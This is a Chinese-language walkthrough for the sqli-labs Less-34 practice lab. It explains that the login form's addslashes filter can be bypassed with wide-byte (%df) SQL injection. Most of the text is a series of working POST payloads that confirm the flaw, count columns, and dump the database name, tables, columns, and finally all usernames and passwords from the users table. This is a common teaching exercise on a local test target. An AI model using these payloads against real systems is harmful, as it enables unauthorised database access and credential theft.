sql-labs-Less-34

方法一：
进入http://127.0.0.1/sql/Less-34/，打开http header live,输入admin：admin登录；
打开最上面的那一个:


从源代码可以看到umane和passwd都被套上了addslashes函数，所以我们可以用宽字节注入。
因为在页面直接注入会被url转码，所以我们在http header live进行注入。


然后跳出一个新页面。


判断字符：
第一步：uname=admin%df’&passwd=admin&submit=Submit（报错）
第二步：uname=admin%df’#&passwd=admin&submit=Submit（不报错）
查列数：uname=admin%df’ order by 2#&passwd=admin&submit=Submit
测位置：uname=aadmin%df’ union select 1,2#&passwd=admin&submit=Submit
爆库：uname=aadmin%df’ union select database(),2#&passwd=admin&submit=Submit
爆表：uname=aadmin%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),2#&passwd=admin&submit=Submit
爆列：uname=aadmin%df’ union select (select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),2#&passwd=admin&submit=Submit
爆字段：uname=aadmin%df’ union select (select group_concat(username) from users),(select group_concat(password) from users)#&passwd=admin&submit=Submit
